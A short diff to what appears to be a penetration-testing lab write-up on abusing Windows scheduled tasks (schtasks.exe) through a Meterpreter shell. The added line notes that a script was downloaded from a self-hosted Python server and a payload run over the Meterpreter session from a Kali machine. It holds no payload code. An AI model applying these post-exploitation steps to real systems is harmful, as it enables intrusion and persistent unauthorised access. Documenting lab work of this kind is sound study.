@@ -6,6 +6,8 @@ The goal of this phase was to abuse native Windows task scheduling mechanics to 
 ### Execution
 After establishing an interactive session, a native Windows shell channel was spawned through **Meterpreter** to bypass framework module discrepancies and interact directly with the host's task configuration utility (`schtasks.exe`).
 
+used a selfhosted server using python to donwnload the script and used meterpreter connection to run the payload on my kali linux machine
+
 ```msf
 meterpreter > shell
 Process 9772 created.
